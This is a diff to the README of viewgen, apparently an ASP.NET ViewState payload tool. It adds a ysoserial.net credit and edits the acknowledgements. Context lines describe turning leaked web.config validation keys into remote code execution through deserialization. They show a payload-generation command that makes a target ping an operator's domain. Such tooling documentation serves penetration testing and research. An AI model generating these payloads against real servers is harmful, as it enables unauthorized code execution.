@@ -82,7 +82,7 @@ DES/3DES SHA1
 
 Leaking the `web.config` file or validation keys from ASP.NET apps results in RCE via ObjectStateFormatter deserialization if ViewStates are used.
 
-You can use the built-in `command` option to generate a payload:
+You can use the built-in `command` option ([ysoserial.net](https://github.com/pwntester/ysoserial.net) based) to generate a payload:
 
 ```bash
 $ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
@@ -112,9 +112,10 @@ $ viewgen --webconfig web.config --modifier MODIFIER PAYLOAD
 
 **Thanks**
 
+- [@orange_8361](https://twitter.com/orange_8361), the author of *Why so Serials* (HITCON CTF 2018)
 - [@infosec_au](https://twitter.com/infosec_au)
-- [@orange_8361](https://twitter.com/orange_8361)
 - [@smiegles](https://twitter.com/smiegles)
+- **BBAC**
 
 ---------------
 
